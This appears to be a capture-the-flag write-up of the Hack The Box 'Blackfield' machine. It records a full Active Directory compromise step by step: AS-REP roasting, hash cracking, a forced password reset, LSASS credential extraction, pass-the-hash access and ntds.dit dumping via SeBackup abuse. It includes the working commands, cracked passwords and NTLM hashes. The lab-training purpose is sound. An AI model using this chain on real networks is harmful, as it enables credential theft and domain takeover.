# SMB Null Authentication
The profile$ share can be connected to with null authentication.
```shell
smbclient \\\\10.10.10.192\\profiles$ -N 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Jun  3 12:47:12 2020
  ..                                  D        0  Wed Jun  3 12:47:12 2020
  AAlleni                             D        0  Wed Jun  3 12:47:11 2020
  ABarteski                           D        0  Wed Jun  3 12:47:11 2020
  ABekesz                             D        0  Wed Jun  3 12:47:11 2020

```
It seems like the list of users. I will create a list and use it to see if any of them have Kerberos pre-auth turned off.

I then tried to make a python script but it did not work. So I mounted the share to my /mnt folder:
```shell
sudo mount -t cifs '//10.10.10.192/profiles$' /mnt

```
With the list of usernames I was able to find some krb5asrep tickets
```shell
kerbrute userenum -d BLACKFIELD.local --dc 10.10.10.192 usernames.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 04/20/24 - Ronnie Flathers @ropnop

2024/04/20 10:00:00 >  Using KDC(s):
2024/04/20 10:00:00 >   10.10.10.192:88

2024/04/20 10:00:20 >  [+] VALID USERNAME:       audit2020@BLACKFIELD.local
2024/04/20 10:02:12 >  [+] support has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$support@BLACKFIELD.LOCAL:cba1662a60c158726c75122921c8f501$1876720ae3320ba45464ed4e4b82cd5e8efe944ca88899ab3f155c39158ae613484583b34953909b2d04efaa2f5f2fecdb5af45794115f1aa70baa6488043ce24878359e5843a0538f4063ea03bb0559de0193fab4769d62e94559aa9548e8674aea28bdcfcc20e19dba3c0045d0e701046aecaefd14859bba4a2f242cbe4d282d17c2dbd5511f85204de90bb6f57aaf90cd09b9f7c6a4e45e948f4c23663dc5dcbabcf29e8761e3aaffa07700c989bba0f075c619d9be3be0d353c450e29a0ae1c3b4fde04a67b8615ea9c5432c2de60df8c36369b83e83fb604df8619e54a133f0a6b59e1a6558526b4441960bddb7fb254c751bc05fd4242818fda93681d9a5d5131a33ca6bcf                        
2024/04/20 10:02:12 >  [+] VALID USERNAME:       support@BLACKFIELD.local
2024/04/20 10:02:17 >  [+] VALID USERNAME:       svc_backup@BLACKFIELD.local
2024/04/20 10:02:42 >  Done! Tested 314 usernames (3 valid) in 162.177 seconds

```

# Cracking the Hash
```shell
$ hashcat -m 18200 support_hash.txt /usr/share/wordlists/rockyou.txt 

$krb5asrep$23$support@BLACKFIELD.local@BLACKFIELD.LOCAL:a5c7cd00d3aa7e801d86db5f70ef1bac$6eeaf3d12adc3fd71d70fc5b493e14aa5823370958e2d3fb911470e628f8d92786211dda427f35ed33287cb15de9eb45a078fd957f2a71393b41f5c0417377066cef7156a6942439e5be68e820f3b9271e8cf13f53a8d52dcea463ef2538a9b5193eb48c0ff2abf7c98d3764738b50ad5deba5adb5fedd097456e23b961378c7dc512b4eac982c685ac56f3c922b79f7ddeaf7c21c7b1807f083634ab6469b7ec9d351f7e328bc4a37be731f3774cd6308b751251b6ae43455b6929263587b9d450c427a144d4a6ab97a3b23f2699464b199837d1138ca7b9127b4f4bdebd68710befb2e3a806346defec1476f0c81973d97cc90:#00^BlackKnight
                                                          
Session..........: hashcat
Status...........: Cracked

```

# Mounting the Profile Share
Once we have obtained the password I am going to see what shares the support user has access to and then mount it for easier directory enum:
```shell
$ crackmapexec smb 10.10.10.192 --shares -u "support" -p '#00^BlackKnight' 
SMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\support:#00^BlackKnight 
SMB         10.10.10.192    445    DC01             [+] Enumerated shares
SMB         10.10.10.192    445    DC01             Share           Permissions     Remark
SMB         10.10.10.192    445    DC01             -----           -----------     ------
SMB         10.10.10.192    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.10.192    445    DC01             C$                              Default share
SMB         10.10.10.192    445    DC01             forensic                        Forensic / Audit share.
SMB         10.10.10.192    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.10.192    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.10.192    445    DC01             profiles$       READ            
SMB         10.10.10.192    445    DC01             SYSVOL          READ            Logon server share 
                                                                                                                                                            
┌──(kali㉿kali)-[~/Desktop/HTB_Machines/Blackfield]
└─$ sudo mount -t cifs -o 'username=support,password=#00^BlackKnight' //10.10.10.192/profiles$ /mnt

```

# Bloodhound data
Now we can get some bloodhound data with the bloodhound for python tool:
```shell
bloodhound-python -u 'support' -p '#00^BlackKnight' -d BLACKFIELD.local -dc DC01.BLACKFIELD.local -c all -ns 10.10.10.192

```

## Changing the audit2020 users password
Due to the support user having the forcechangepassword rights over the audit2020 user we can change the password:
```shell
└─$ net rpc password audit2020 abc123! -U BLACKFIELD.local/support%#00^BlackKnight -S 10.10.10.192

```

With this user we can now view the forensic share!

# Lsass.dmp
So you will find a lsass.dmp file in the memory_analysis directory of the smbshare.

If you dump that with pypykatz
```shell
pypykatz lsa minidump lsass.DMP
```

You will get the ntlm hash for both the admin and the svc_backup user.

Login with evil-winrm:
```shell
evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
```

# Privilege Escalation
```shell
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled



*Evil-WinRM* PS C:\Users\svc_backup\Desktop> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288

```
# Exploiting the SeBackup Priviledge
```shell
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> upload /home/kali/Desktop/HTB_Machines/Blackfield/SeBackupPrivilegeCmdLets.dll
                                        
Info: Uploading /home/kali/Desktop/HTB_Machines/Blackfield/SeBackupPrivilegeCmdLets.dll to C:\Users\svc_backup\Desktop\SeBackupPrivilegeCmdLets.dll
                                        
Data: 16384 bytes of 16384 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> upload /home/kali/Desktop/HTB_Machines/Blackfield/SeBackupPrivilegeUtils.dll
                                        
Info: Uploading /home/kali/Desktop/HTB_Machines/Blackfield/SeBackupPrivilegeUtils.dll to C:\Users\svc_backup\Desktop\SeBackupPrivilegeUtils.dll
                                        
Data: 21844 bytes of 21844 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> Import-Module .\SeBackupPrivilegeUtils.dll
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> Import-Module .\SeBackupPrivilegeCmdLets.dll
```

## Getting the hives
```shell
Evil-WinRM* PS C:\Users\svc_backup\Desktop> reg save hklm\sam c:\Users\svc_backup\Desktop\sam
The operation completed successfully.

*Evil-WinRM* PS C:\Users\svc_backup\Desktop> reg save hklm\system c:\Users\svc_backup\Desktop\system
The operation completed successfully.

*Evil-WinRM* PS C:\Users\svc_backup\Desktop> download sam
                                        
Info: Downloading C:\Users\svc_backup\Desktop\sam to sam
                                        
Info: Download successful!
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> download system
                                        
Info: Downloading C:\Users\svc_backup\Desktop\system to system
                                        
Info: Download successful!


```

## Pypykatz 4 da win

```shell
pypykatz registry --sam sam system              
WARNING:pypykatz:SECURITY hive path not supplied! Parsing SECURITY will not work
WARNING:pypykatz:SOFTWARE hive path not supplied! Parsing SOFTWARE will not work
============== SYSTEM hive secrets ==============
CurrentControlSet: ControlSet001
Boot Key: 73d83e56de8961ca9f243e1a49638393
============== SAM hive secrets ==============
HBoot Key: 1d645695662cc2a70d54ee626104485110101010101010101010101010101010
Administrator:500:aad3b435b51404eeaad3b435b51404ee:67ef902eae0d740df6257f273de75051:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

```

Didn't work so doing it another

```shell
sudo smbserver.py -smb2support SendMeYoData $(pwd)
[sudo] password for kali: 
/usr/local/bin/smbserver.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.12.0.dev1+20240327.181547.f8899e65', 'smbserver.py')
Impacket v0.12.0.dev1+20240327.181547.f8899e65 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed

```

# DiskShadow
```shell
$scriptPath = "C:\Users\svc_backup\Documents\script.dsh"
$tempPath = "$scriptPath-temp"
Get-Content -Path $scriptPath | Out-File -FilePath $tempPath -Encoding ASCII
diskshadow /s script.dsh-temp

*Evil-WinRM* PS C:\Users\svc_backup\Documents> robocopy /B E:\Windows\NTDS .\ntds ntds.dit

download ntds.dit

```

# Dump them hashes
```shell
─$ secretsdump.py  -system system  -ntds ntds.dit LOCAL
Impacket v0.12.0.dev1+20240327.181547.f8899e65 - Copyright 2023 Fortra

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:efff3c3e8729ce9ed9335fa5b5027acc:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:44f077e27f6fef69e7bd834c7242b040:::
support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::

```